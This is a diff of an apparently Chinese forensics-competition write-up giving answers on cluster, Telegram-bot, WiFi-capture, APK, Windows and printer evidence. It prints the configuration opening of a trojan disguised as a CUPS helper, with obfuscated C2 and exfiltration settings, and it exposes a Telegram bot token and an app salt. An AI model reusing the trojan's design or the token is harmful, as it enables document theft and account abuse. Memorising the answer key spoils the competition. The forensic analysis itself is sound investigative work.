-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">max_backups</span>=<span style="color:#ae81ff">3</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#消息模板</span>
-</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">message</span>]
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">join_hint</span>=<span style="color:#e6db74">&#34;欢迎 [%s](%s) 加入 %s\n ⚠️本群已开启新成员验证功能，未通过验证的用户无法发言 \n超时未完成验证会被移除本群！ \n⏱本条消息 %d 秒后自动删除\n👇点击下方按钮自助解除禁言&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">captcha_image</span>=<span style="color:#e6db74">&#34;欢迎您加入[%s]！\n⚠本群已开启新成员验证功能。\n👆为了证明您不是机器人，请发送以上图片验证码内容\n🤖机器人将自动验证您发送的验证码内容是否正确\n⏱本条验证消息有效期[%d]秒&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">verification_complete</span>=<span style="color:#e6db74">&#34;恭喜您成功通过[🤖人机验证]，系统已为您解除禁言限制。\n如若还是无法发言，请重启telegram客户端\n请同时注意群内发言规范，以防永久禁止&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">block_hint</span>=<span style="color:#e6db74">&#34;\\#封禁预警\n[%s](%s) 请注意,您的消息中含有部分违禁词 \n⚠️您已被系统判断为高风险用户，已被封禁\n系统已向超管发送预警信息，若由超管判定为误杀，会及时将您解除封禁。\n您的违禁词包含：%s&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#广告阻止</span>
-</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">adblock</span>]
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">number_of_forbidden_words</span>=<span style="color:#ae81ff">2</span> <span style="color:#75715e"># 违禁词判定个数，如果一句话中出现的违禁词为该设置个数，则判断为违禁</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">block_time</span>=<span style="color:#ae81ff">-1</span> <span style="color:#75715e"># 阻止时间，单位：秒。如果为-1，则代表永久封禁</span>
-</span></span></code></pre></div><p>答案：kk.xilika.cc</p>
-<p>12.嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/45.png"></p>
-<p>答案：西门庆交流群</p>
-<p>13.统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）</p>
-<p>captchabot数据库查询：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">COUNT</span>(<span style="color:#f92672">*</span>) <span style="color:#66d9ef">FROM</span> user_captcha_record <span style="color:#66d9ef">WHERE</span> captcha_success_time <span style="color:#f92672">&gt;=</span> <span style="color:#e6db74">&#39;2025-06-01&#39;</span> ;
-</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/SZB2025CS/46.png"></p>
-<p>答案：2422</p>
-<p>14.据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）</p>
-<p>15.
-发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）</p>
-<p>16.发卡网站的后台访问路径是？（答案格式：/root）</p>
-<p>localhost机器上有dujiaoka.tar，解压就是网址源码，.env：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/47.png"></p>
-<p>答案：/admin</p>
-<p>17.计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）</p>
-<p>仍然是.env：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/48.png"></p>
-<p>答案：UudHxLyk7HqpUcTQ99p6NZMFxC7eInhkagTLks8oYfk=</p>
-<p>18.发卡网站配置的邮件发送人地址是？（答案格式：abc@abc.com）</p>
-<p>19.
-当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）</p>
-<p>/config/dujiaoka.php：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/49.png"></p>
-<p>答案：2.0.5</p>
-<p>20.
-当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）</p>
-<h2 id="流量包分析">流量包分析<a hidden class="anchor" aria-hidden="true" href="#流量包分析">#</a></h2>
-<p>21.黑客攻击的目标路由器SSID为 （答案格式：请按实际值填写）</p>
-<p>22.黑客成功捕获了WIFI中WPA协议握手包，其中有效握手包组数为(完整握手为一组)（答案格式：1）</p>
-<p>使用过滤器 eapol 可以快速定位 WPA 握手的相关报文：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/24.png"></p>
-<p>答案：4</p>
-<p>23.黑客爆破得出的WiFi密码为（提示：密码由小写英文字母和数字组成）（答案格式：abcd1234）</p>
-<p>24.黑客成功连接Wifi后，发现路由器操作系统为？（答案格式：请按实际值填写）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/30.png"></p>
-<p>答案：Linux ImmortalWrt</p>
-<p>25.黑客对路由器后台进行爆破攻击，该路由器后台密码为（答案格式：请按实际值填写）</p>
-<p>26.黑客通过修改路由器设置，将被劫持的域名为（答案格式：www.xxx.com）</p>
-<p>27.黑客在路由器管理后台发现FTP服务配置，FTP登录密码为?（答案格式:请按实际值填写）</p>
-<p>过滤 FTP 协议：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/25.png"></p>
-<p>答案：mast</p>
-<p>28.黑客通过FTP上传了一个压缩包文件，该文件内容为（答案格式：请按实际值填写）</p>
-<p>找PK头：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/26.png"></p>
-<p>爆破密码 4321：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/27.png"></p>
-<p>答案：code:123456789</p>
-<p>29.黑客通过路由器执行shell脚本，反弹shell的监听端口为（答案格式：1）</p>
-<p>几个反弹shell关键词都找一遍，nc：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/28.png"></p>
-<p>答案：4445</p>
-<p>30.黑客通过反弹shell成功控制目标路由器后，总共执行了多少条命令（答案格式：1)</p>
-<p>根据ip 192.168.1.244 来过滤，再翻到最下面的部分找：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/29.png"></p>
-<p>执行的命令：</p>
-<pre tabindex="0"><code>ipconfig
+</code></pre><p>mysql 和 redis 的服务都在正常运行：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/44.png></p><p>web服务的yaml php-nginx-deployment.yaml：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#75715e># php-nginx-deployment.yaml</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>apps/v1</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Deployment</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>php-nginx</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>replicas</span>: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>selector</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>matchLabels</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>app</span>: <span style=color:#ae81ff>php-nginx</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>template</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>metadata</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>labels</span>:
+</span></span><span style=display:flex><span>        <span style=color:#f92672>app</span>: <span style=color:#ae81ff>php-nginx</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>spec</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>containers</span>:
+</span></span><span style=display:flex><span>        - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>php-nginx</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>image</span>: <span style=color:#ae81ff>webdevops/php-nginx:7.4</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>ports</span>:
+</span></span><span style=display:flex><span>            - <span style=color:#f92672>containerPort</span>: <span style=color:#ae81ff>80</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>env</span>:
+</span></span><span style=display:flex><span>            - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>APP_USER</span>
+</span></span><span style=display:flex><span>              <span style=color:#f92672>value</span>: <span style=color:#e6db74>&#34;nginx&#34;</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>volumeMounts</span>:
+</span></span><span style=display:flex><span>            - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>dujiaoka-pv-storage</span>
+</span></span><span style=display:flex><span>              <span style=color:#f92672>mountPath</span>: <span style=color:#ae81ff>/app</span>
+</span></span><span style=display:flex><span>            - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>nginx-config</span>
+</span></span><span style=display:flex><span>              <span style=color:#f92672>mountPath</span>: <span style=color:#ae81ff>/opt/docker/etc/nginx/vhost.conf</span>
+</span></span><span style=display:flex><span>              <span style=color:#f92672>subPath</span>: <span style=color:#ae81ff>vhost.conf</span>
+</span></span><span style=display:flex><span>            - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>supervisor-config</span>
+</span></span><span style=display:flex><span>              <span style=color:#f92672>mountPath</span>: <span style=color:#ae81ff>/opt/docker/etc/supervisor.d/dujiaoka.conf</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>volumes</span>:
+</span></span><span style=display:flex><span>        - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>dujiaoka-pv-storage</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>persistentVolumeClaim</span>:
+</span></span><span style=display:flex><span>            <span style=color:#f92672>claimName</span>: <span style=color:#ae81ff>dujiaoka</span>
+</span></span><span style=display:flex><span>        - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>nginx-config</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>configMap</span>:
+</span></span><span style=display:flex><span>            <span style=color:#f92672>name</span>: <span style=color:#ae81ff>nginx-dujiaoka-config</span>
+</span></span><span style=display:flex><span>        - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>supervisor-config</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>configMap</span>:
+</span></span><span style=display:flex><span>            <span style=color:#f92672>name</span>: <span style=color:#ae81ff>dujiaoka-supervisor-config</span>
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>v1</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Service</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>php-nginx-service</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>selector</span>:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>app</span>: <span style=color:#ae81ff>php-nginx</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>ports</span>:
+</span></span><span style=display:flex><span>    - <span style=color:#f92672>port</span>: <span style=color:#ae81ff>80</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>targetPort</span>: <span style=color:#ae81ff>80</span>
+</span></span></code></pre></div><p>指定了挂载的目录 mountPath: /app ，localhost机器中把 dujiaoka.tar 解压到 /app</p><p>1.node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/36.png></p><p>源盘SHA256：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/38.png></p><p>答案：FC9A34</p><p>2.集群配置了多少个node节点？（答案格式：1）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/15.png></p><p>答案：2</p><p>3.嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/14.png></p><p>答案：09:35:59</p><p>4.Docker的安装日期是？（使用双位数格式，答案格式：01月01日）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/13.png></p><p>答案：04月08日</p><p>5.Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）</p><p>查看 Docker 服务的环境变量配置 <code>systemctl show docker --property Environment</code>：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/37.png></p><p>答案：4780</p><p>6.发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）</p><p>查看 Kubernetes 集群中的 Service（服务）<code>kubectl get svc</code>：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/39.png></p><p>答案：30627</p><p>7.发卡网站部署使用的镜像名称是？（答案格式：root/root）</p><p>根据上题的服务去找对应镜像：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/40.png></p><p>答案：webdevops/php-nginx</p><p>8.当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）</p><p>查看特定命名空间中的特定Pod详情 <code>kubectl describe pod captcha-bot-6b4d85b765-4ntkh -n default</code>：</p><p>9.发卡网站使用的缓存数据库是？（答案格式：mysql）</p><p>pod里有redis</p><p>答案：redis</p><p>10.集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：/root/root）</p><p>答案：/data/k8s_data/default/dujiaoka</p><p>11.Telegram群管机器人配置的API代理域名是？（答案格式：www.xxx.com）</p><p>localhost机器 /data/k8s_data/default/captchaBot/config/config.toml：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-toml data-lang=toml><span style=display:flex><span><span style=color:#75715e>#系统设置</span>
+</span></span><span style=display:flex><span>[<span style=color:#a6e22e>system</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app_debbug</span>=<span style=color:#66d9ef>false</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>join_hint_after_del_time</span>=<span style=color:#ae81ff>60</span> <span style=color:#75715e># 加群验证提示消息多久删除，秒</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>captcha_timeout</span>=<span style=color:#ae81ff>120</span> <span style=color:#75715e># 验证超时时间，秒</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>runtime_path</span>=<span style=color:#e6db74>&#34;/runtime&#34;</span> <span style=color:#75715e># 缓存目录</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#telegram 配置</span>
+</span></span><span style=display:flex><span>[<span style=color:#a6e22e>telegram</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>bot_token</span>=<span style=color:#e6db74>&#34;8378348497:AAGSu7pC5rrDicjMqa7Mv9atvB1iE5NAZeY&#34;</span> <span style=color:#75715e># 机器人apitoken</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>api_proxy</span>=<span style=color:#e6db74>&#34;http://kk.xilika.cc&#34;</span> <span style=color:#75715e># telegram api代理，仅大陆地区服务器需要</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>manage_users</span>=[<span style=color:#ae81ff>6213151597</span>] <span style=color:#75715e># 超级管理员userid数组，以英文逗号分割，例如123,456,789</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#日志配置</span>
+</span></span><span style=display:flex><span>[<span style=color:#a6e22e>log</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>max_size</span>=<span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>max_age</span>=<span style=color:#ae81ff>7</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>max_backups</span>=<span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#消息模板</span>
+</span></span><span style=display:flex><span>[<span style=color:#a6e22e>message</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>join_hint</span>=<span style=color:#e6db74>&#34;欢迎 [%s](%s) 加入 %s\n ⚠️本群已开启新成员验证功能，未通过验证的用户无法发言 \n超时未完成验证会被移除本群！ \n⏱本条消息 %d 秒后自动删除\n👇点击下方按钮自助解除禁言&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>captcha_image</span>=<span style=color:#e6db74>&#34;欢迎您加入[%s]！\n⚠本群已开启新成员验证功能。\n👆为了证明您不是机器人，请发送以上图片验证码内容\n🤖机器人将自动验证您发送的验证码内容是否正确\n⏱本条验证消息有效期[%d]秒&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>verification_complete</span>=<span style=color:#e6db74>&#34;恭喜您成功通过[🤖人机验证]，系统已为您解除禁言限制。\n如若还是无法发言，请重启telegram客户端\n请同时注意群内发言规范，以防永久禁止&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>block_hint</span>=<span style=color:#e6db74>&#34;\\#封禁预警\n[%s](%s) 请注意,您的消息中含有部分违禁词 \n⚠️您已被系统判断为高风险用户，已被封禁\n系统已向超管发送预警信息，若由超管判定为误杀，会及时将您解除封禁。\n您的违禁词包含：%s&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#广告阻止</span>
+</span></span><span style=display:flex><span>[<span style=color:#a6e22e>adblock</span>]
+</span></span><span style=display:flex><span><span style=color:#a6e22e>number_of_forbidden_words</span>=<span style=color:#ae81ff>2</span> <span style=color:#75715e># 违禁词判定个数，如果一句话中出现的违禁词为该设置个数，则判断为违禁</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>block_time</span>=<span style=color:#ae81ff>-1</span> <span style=color:#75715e># 阻止时间，单位：秒。如果为-1，则代表永久封禁</span>
+</span></span></code></pre></div><p>答案：kk.xilika.cc</p><p>12.嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/45.png></p><p>答案：西门庆交流群</p><p>13.统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）</p><p>captchabot数据库查询：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#66d9ef>COUNT</span>(<span style=color:#f92672>*</span>) <span style=color:#66d9ef>FROM</span> user_captcha_record <span style=color:#66d9ef>WHERE</span> captcha_success_time <span style=color:#f92672>&gt;=</span> <span style=color:#e6db74>&#39;2025-06-01&#39;</span> ;
+</span></span></code></pre></div><p><img alt=alt loading=lazy src=/images/SZB2025CS/46.png></p><p>答案：2422</p><p>14.据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）</p><p>15.
+发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）</p><p>16.发卡网站的后台访问路径是？（答案格式：/root）</p><p>localhost机器上有dujiaoka.tar，解压就是网址源码，.env：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/47.png></p><p>答案：/admin</p><p>17.计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）</p><p>仍然是.env：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/48.png></p><p>答案：UudHxLyk7HqpUcTQ99p6NZMFxC7eInhkagTLks8oYfk=</p><p>18.发卡网站配置的邮件发送人地址是？（答案格式：abc@abc.com）</p><p>19.
+当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）</p><p>/config/dujiaoka.php：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/49.png></p><p>答案：2.0.5</p><p>20.
+当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）</p><h2 id=流量包分析>流量包分析<a hidden class=anchor aria-hidden=true href=#流量包分析>#</a></h2><p>21.黑客攻击的目标路由器SSID为 （答案格式：请按实际值填写）</p><p>22.黑客成功捕获了WIFI中WPA协议握手包，其中有效握手包组数为(完整握手为一组)（答案格式：1）</p><p>使用过滤器 eapol 可以快速定位 WPA 握手的相关报文：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/24.png></p><p>答案：4</p><p>23.黑客爆破得出的WiFi密码为（提示：密码由小写英文字母和数字组成）（答案格式：abcd1234）</p><p>24.黑客成功连接Wifi后，发现路由器操作系统为？（答案格式：请按实际值填写）</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/30.png></p><p>答案：Linux ImmortalWrt</p><p>25.黑客对路由器后台进行爆破攻击，该路由器后台密码为（答案格式：请按实际值填写）</p><p>26.黑客通过修改路由器设置，将被劫持的域名为（答案格式：www.xxx.com）</p><p>27.黑客在路由器管理后台发现FTP服务配置，FTP登录密码为?（答案格式:请按实际值填写）</p><p>过滤 FTP 协议：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/25.png></p><p>答案：mast</p><p>28.黑客通过FTP上传了一个压缩包文件，该文件内容为（答案格式：请按实际值填写）</p><p>找PK头：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/26.png></p><p>爆破密码 4321：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/27.png></p><p>答案：code:123456789</p><p>29.黑客通过路由器执行shell脚本，反弹shell的监听端口为（答案格式：1）</p><p>几个反弹shell关键词都找一遍，nc：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/28.png></p><p>答案：4445</p><p>30.黑客通过反弹shell成功控制目标路由器后，总共执行了多少条命令（答案格式：1)</p><p>根据ip 192.168.1.244 来过滤，再翻到最下面的部分找：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/29.png></p><p>执行的命令：</p><pre tabindex=0><code>ipconfig
 uname -a
 cd /root
 ls
-</code></pre><p>答案：4</p>
-<h2 id="apk程序分析">APK程序分析<a hidden class="anchor" aria-hidden="true" href="#apk程序分析">#</a></h2>
-<p>31.apk 的版本名称为？ （答案格式：1.1.1）</p>
-<p>AndroidManifest.xml：</p>
-<pre tabindex="0"><code>android:versionName=&#34;3.0.12&#34;
-</code></pre><p>答案：3.0.12</p>
-<p>32.在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）</p>
-<p>在线网站 51.al 脱壳，jadx 反编译 classes2.dex：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/19.png"></p>
-<p>答案：currentTimeMillis</p>
-<p>33.apk运行后getVer()的返回值是多少？（答案格式：1.0.0）</p>
-<h2 id="计算机取证分析">计算机取证分析<a hidden class="anchor" aria-hidden="true" href="#计算机取证分析">#</a></h2>
-<p>41.操作系统的 Build 版本号是？（答案格式：1）</p>
-<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/50.png"></p>
-<p>答案：19044</p>
-<p>42.操作系统设置的账户密码最长存留期为多少天？（答案格式：1）</p>
-<p>仿真后命令行输入 <code>net accounts</code> ：</p>
-<p>答案：68</p>
-<p>46.123.VHD 所处的结束扇区是？（答案格式：1）</p>
-<p>先找到 123.vhd，在 <code>C:\\Administrator\Documents</code> 中，在 File 选中文件尾部或直接 <code>Ctrl+End</code>，再回到 Partition 即可找到文件结束扇区：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/51.png"></p>
-<p>答案：27445225</p>
-<h2 id="物联网设备取证分析">物联网设备取证分析<a hidden class="anchor" aria-hidden="true" href="#物联网设备取证分析">#</a></h2>
-<p>66.打印机的主机名称是什么？(答案格式：root)</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/16.png"></p>
-<p>答案：print</p>
-<p>67.打印文件存储在哪个目录？(答案格式：/root/root)</p>
-<p>/etc/cups/cups-files.conf：</p>
-<pre tabindex="0"><code># Location of all spool files... 
+</code></pre><p>答案：4</p><h2 id=apk程序分析>APK程序分析<a hidden class=anchor aria-hidden=true href=#apk程序分析>#</a></h2><p>31.apk 的版本名称为？ （答案格式：1.1.1）</p><p>AndroidManifest.xml：</p><pre tabindex=0><code>android:versionName=&#34;3.0.12&#34;
+</code></pre><p>答案：3.0.12</p><p>32.在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）</p><p>在线网站 51.al 脱壳，jadx 反编译 classes2.dex：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/19.png></p><p>答案：currentTimeMillis</p><p>33.apk运行后getVer()的返回值是多少？（答案格式：1.0.0）</p><h2 id=计算机取证分析>计算机取证分析<a hidden class=anchor aria-hidden=true href=#计算机取证分析>#</a></h2><p>41.操作系统的 Build 版本号是？（答案格式：1）</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/50.png></p><p>答案：19044</p><p>42.操作系统设置的账户密码最长存留期为多少天？（答案格式：1）</p><p>仿真后命令行输入 <code>net accounts</code> ：</p><p>答案：68</p><p>46.123.VHD 所处的结束扇区是？（答案格式：1）</p><p>先找到 123.vhd，在 <code>C:\\Administrator\Documents</code> 中，在 File 选中文件尾部或直接 <code>Ctrl+End</code>，再回到 Partition 即可找到文件结束扇区：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/51.png></p><p>答案：27445225</p><h2 id=物联网设备取证分析>物联网设备取证分析<a hidden class=anchor aria-hidden=true href=#物联网设备取证分析>#</a></h2><p>66.打印机的主机名称是什么？(答案格式：root)</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/16.png></p><p>答案：print</p><p>67.打印文件存储在哪个目录？(答案格式：/root/root)</p><p>/etc/cups/cups-files.conf：</p><pre tabindex=0><code># Location of all spool files... 
 #RequestRoot /var/spool/cups
-</code></pre><p>答案：/var/spool/cups</p>
-<p>68.同一天，打印两份文件的用户是谁？(答案格式：root)</p>
-<p>/var/log/cups/page_log：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/18.png"></p>
-<p>答案：alice</p>
-<p>69.分析物联网检材，木马运行后，自身产生的进程ID是多少？（答案格式：1）</p>
-<p>木马 /usr/local/bin/cups-helper：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3 </span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*- </span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># A helper script to manage CUPS spooling and perform health checks. </span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Do not modify unless you are an authorized technician. </span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># KVJEYIHHXSLOPIEBEAWT4ICCMFZWKNRUEDT3ZFXHUCASALJ6EDS23F7HVSTOJOFS4WHY32F5VQ====== </span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> shutil 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime 
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re 
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- Configuration --- </span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># C2 server for uploading diagnostic data </span>
-</span></span><span style="display:flex;"><span>C2_SERVER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;zUTMugDMx4SO5EjL1gTM&#34;</span> 
-</span></span><span style="display:flex;"><span>C2_PORT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;zQDN&#34;</span> 
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Spool directory to monitor </span>
-</span></span><span style="display:flex;"><span>SPOOL_DIR <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GJTJzBXdjZkMlw2bvB3cGJTJyFmdGJTJ&#34;</span> 
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define staging directory for processing before exfiltration </span>
-</span></span><span style="display:flex;"><span>STAGING_DIR <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GJTJlh2YhNmLGJTJw1GdGJTJ&#34;</span> 
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Log file for upload activities </span>
-</span></span><span style="display:flex;"><span>LOG_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;==wZvxmLkF2bsBXdGJTJlJXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ&#34;</span> 
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Keyword to identify sensitive documents for &#34;special handling&#34; </span>
-</span></span><span style="display:flex;"><span>WATCHED_KEYWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;=UmcpZmbvdWYyREMyUCdjVmavJHU&#34;</span> 
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- End Configuration --- </span>
-</span></span><span style="display:flex;"><span>
